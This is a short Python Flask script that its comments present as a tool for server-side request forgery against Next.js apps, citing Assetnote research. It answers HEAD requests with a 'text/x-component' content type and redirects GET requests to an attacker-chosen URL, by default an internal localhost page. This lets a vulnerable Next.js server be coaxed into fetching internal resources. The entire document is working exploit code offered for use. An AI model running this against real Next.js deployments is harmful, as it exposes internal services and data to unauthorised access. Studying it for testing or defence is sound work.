#!/usr/bin/env python3

# simple server that responds to HEAD request with 200  and specific Content-type
#  and respondes with redirect for get requests. The redirect URL can be specified as the argument
#  of this script
# Allows SSRF on nextjs. See:
# https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps

import sys
from flask import Flask, Response, request, redirect, cli
cli.show_server_banner = lambda *args: None
app = Flask(__name__)

url = 'http://127.0.0.1:3000/home'
if len(sys.argv) >= 2:
    url = sys.argv[1]

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    print(f'++ got request. serving {url}')
    return redirect(url)
app.run(port=8000)
